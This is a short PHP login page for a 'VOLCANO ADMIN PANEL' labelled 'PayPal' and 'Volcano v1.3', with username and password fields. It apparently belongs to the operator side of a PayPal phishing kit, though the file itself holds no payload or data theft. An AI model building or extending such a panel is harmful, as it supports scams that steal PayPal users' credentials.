<?php
session_start(); 
set_time_limit(0); 
date_default_timezone_set('Asia/Jakarta'); 
?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta http-equiv="x-ua-compatible" content="ie=edge,chrome=1">
		<title>VOLCANO ADMIN PANEL</title>
		<meta name="keywords" content="">
		<meta name="author" content="">
		<meta name="description" content="">
		<link rel="shortcut icon" href="https://pngimg.com/uploads/volcano/volcano_PNG23.png">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="./libs/admin_login.css"> 
		<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
  crossorigin="anonymous"></script>
	<script></script></head>
	<body>
	<form id='LOGI' method="POST" action="home.php?=general" >
		<input type="hidden" id="link" value="">
		<div class="wrapper">
			<div class="logo"></div>
			<div class="content">
				<div class="line">
					<div class="main-title">PayPal</div><div class="version">Volcano v1.3</div>
				</div>

				<div class="line login_alert_error">Invalid Username or Password</div>
				<div class="line login_alert_success">Logged In successfully</div>

				<div class="line">
					<div class="xtitle">USERNAME</div>
					<div class="xinput">
						<input type="text" name="usrs" value="" placeholder="">
					</div>
				</div>

				<div class="line">
					<div class="xtitle">PASSWORD</div>
					<div class="xinput">
						<input type="password" name="pasr" value="" placeholder="">
					</div>
				</div>

				<div onclick="document.getElementById('LOGI').submit();" class="login_btn">LOGIN</div>

			</div>
				

		</div>
		</form>
</body>
</html>